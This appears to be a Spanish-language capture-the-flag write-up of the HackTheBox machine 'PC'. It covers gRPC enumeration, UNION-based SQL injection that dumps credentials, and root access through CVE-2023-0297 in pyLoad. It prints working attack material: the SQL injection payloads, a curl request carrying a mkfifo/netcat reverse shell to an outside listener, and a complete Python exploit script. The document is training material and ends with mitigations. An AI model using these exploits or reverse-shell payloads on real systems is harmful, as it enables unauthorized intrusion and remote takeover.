---
title: "PC - HackTheBox"
description: "Writeup de la máquina PC de HackTheBox, una máquina Linux fácil que involucra explotación de gRPC con SQLi y escalada mediante pyLoad."
pubDate: 2024-11-02
platform: "htb"
category: "machines"
difficulty: "easy"
os: "linux"
language: es
tags: ["grpc", "sqli", "pyload", "CVE-2023-0297", "protobuf"]
retired: false
logo: "/images/writeups/htb/pc/logo.png"
heroImage: "/images/writeups/htb/pc/card.png"
attackVectors: ["network", "web"]
techniques: ["T1190", "T1190", "T1068"]
vulnerabilities: ["CVE-2023-0297", "sql-injection"]
certifications: ["OSCP", "eJPT"]
skillLevel: "beginner"
estimatedTime: "2-3 horas"
points: 20
rating: 4.3
---

# PC - HackTheBox Writeup

**Dificultad**: Easy  
**OS**: Linux  
**Plataforma**: HackTheBox  
**IP**: 10.10.11.214

## Introducción

PC es una máquina Linux de dificultad fácil que presenta un servicio gRPC vulnerable a SQL Injection. Después de explotar esta vulnerabilidad para obtener credenciales, encontraremos un servicio pyLoad vulnerable a CVE-2023-0297 para obtener acceso root.

## Reconocimiento

### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.214 -oG allPorts
```

**Puertos abiertos:**
- 22/tcp - SSH
- 50051/tcp - Unknown

### Escaneo de servicios

```bash
nmap -p22,50051 -sCV 10.10.11.214 -oN targeted
```

**Resultados:**
- **22/tcp** - OpenSSH 8.2p1 Ubuntu
- **50051/tcp** - Sin identificar (gRPC)

## Enumeración gRPC

El puerto 50051 típicamente ejecuta **gRPC**, un framework RPC de alto rendimiento.

### Instalación de herramientas gRPC

```bash
pip3 install grpcurl grpcui
```

o descargamos grpcurl:

```bash
wget https://github.com/fullstorydev/grpcurl/releases/download/v1.8.9/grpcurl_1.8.9_linux_x86_64.tar.gz
tar -xvf grpcurl_1.8.9_linux_x86_64.tar.gz
chmod +x grpcurl
```

### Enumeración de servicios gRPC

```bash
./grpcurl -plaintext 10.10.11.214:50051 list
```

**Resultado:**
```
SimpleApp
grpc.reflection.v1alpha.ServerReflection
```

### Enumeración de métodos

```bash
./grpcurl -plaintext 10.10.11.214:50051 list SimpleApp
```

**Métodos disponibles:**
```
SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo
```

### Descripción del servicio

```bash
./grpcurl -plaintext 10.10.11.214:50051 describe SimpleApp
```

## Explotación

### Registro de usuario

```bash
./grpcurl -plaintext -d '{"username": "test", "password": "test123"}' 10.10.11.214:50051 SimpleApp.RegisterUser
```

**Respuesta:**
```json
{
  "message": "Account created for user test!"
}
```

### Login

```bash
./grpcurl -plaintext -d '{"username": "test", "password": "test123"}' 10.10.11.214:50051 SimpleApp.LoginUser
```

**Respuesta:**
```json
{
  "message": "Your id is 812."
}
```

### GetInfo

Probamos el método getInfo:

```bash
./grpcurl -plaintext -d '{"id": "812"}' 10.10.11.214:50051 SimpleApp.getInfo
```

**Respuesta:**
```json
{
  "message": "Authorization Error.Missing 'token' header"
}
```

### Token de autenticación

Necesitamos el token JWT. Usando grpcui para mejor interacción:

```bash
grpcui -plaintext 10.10.11.214:50051
```

Esto abre una interfaz web. Hacemos login y capturamos el token en Burp Suite.

### SQL Injection en getInfo

El parámetro `id` es vulnerable a SQL Injection:

```bash
./grpcurl -plaintext -H "token: <TOKEN>" -d '{"id": "1 OR 1=1"}' 10.10.11.214:50051 SimpleApp.getInfo
```

### Extracción de información con SQLMap

Guardamos la petición en un archivo y usamos SQLMap:

```bash
sqlmap -r request.txt --batch --dump
```

o manualmente con UNION-based SQLi:

```bash
# Número de columnas
./grpcurl -plaintext -H "token: <TOKEN>" -d '{"id": "1 UNION SELECT NULL,NULL--"}' 10.10.11.214:50051 SimpleApp.getInfo

# Extracción de datos
./grpcurl -plaintext -H "token: <TOKEN>" -d '{"id": "1 UNION SELECT username,password FROM accounts--"}' 10.10.11.214:50051 SimpleApp.getInfo
```

**Credenciales encontradas:**
- Usuario: sau
- Password: HereIsYourPassWord1431

### SSH como sau

```bash
ssh sau@10.10.11.214
# Password: HereIsYourPassWord1431
```

**User flag:**
```bash
cat /home/sau/user.txt
```

## Post-Explotación

### Enumeración de servicios

```bash
netstat -tulpn
ss -tulpn
```

Encontramos un servicio interno en el puerto 8000:

```bash
curl http://localhost:8000
```

Es una instancia de **pyLoad** (gestor de descargas).

### Port Forwarding

```bash
ssh -L 8000:localhost:8000 sau@10.10.11.214
```

Ahora accedemos a `http://localhost:8000` desde nuestro navegador.

## Escalada de Privilegios

### CVE-2023-0297 - pyLoad Pre-auth RCE

pyLoad 0.5.0b3.dev31 es vulnerable a **CVE-2023-0297**, que permite RCE sin autenticación.

### Verificación de versión

En la interfaz web podemos ver la versión: **pyLoad 0.5.0b3.dev31**

### Exploit

```bash
curl -i -s -k -X POST \
  --data-binary "jk=pyimport%20os;os.system('rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|bash%20-i%202>&1|nc%2010.10.14.5%20443%20>/tmp/f');f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa" \
  'http://localhost:8000/flash/addcrypted2'
```

### Listener

```bash
nc -lvnp 443
```

**Root flag:**
```bash
cat /root/root.txt
```

### Alternativa: Exploit con Python

```python
#!/usr/bin/env python3
import requests
import argparse

def exploit(target, lhost, lport):
    url = f"http://{target}/flash/addcrypted2"
    
    payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {lhost} {lport} >/tmp/f"
    
    data = {
        "jk": f"pyimport os;os.system('{payload}');f=function f2(){{}};",
        "package": "xxx",
        "crypted": "AAAA",
        "passwords": "aaaa"
    }
    
    response = requests.post(url, data=data)
    print(f"[+] Exploit sent! Status: {response.status_code}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True, help="Target (IP:PORT)")
    parser.add_argument("-l", "--lhost", required=True, help="Listener IP")
    parser.add_argument("-p", "--lport", required=True, help="Listener PORT")
    
    args = parser.parse_args()
    exploit(args.target, args.lhost, args.lport)
```

Uso:

```bash
python3 exploit.py -t localhost:8000 -l 10.10.14.5 -p 443
```

## Conclusión

PC es una excelente máquina para aprender sobre:
- Enumeración y explotación de servicios gRPC
- SQL Injection en contextos no tradicionales
- Análisis de APIs con Protocol Buffers
- CVE-2023-0297 - pyLoad RCE
- Port forwarding y pivoting
- Análisis de servicios internos

**Lecciones aprendidas:**
- Los servicios gRPC pueden tener las mismas vulnerabilidades que las APIs REST
- La enumeración de servicios internos es crucial
- Siempre verificar versiones de software para CVEs conocidas
- El port forwarding es esencial para acceder a servicios internos

**Mitigaciones:**
- Implementar validación de entrada en todos los parámetros
- Usar consultas preparadas para prevenir SQL Injection
- Actualizar pyLoad a versiones parcheadas
- No exponer servicios de gestión en interfaces de red
- Implementar autenticación robusta en todos los endpoints
- Usar Web Application Firewalls (WAF)
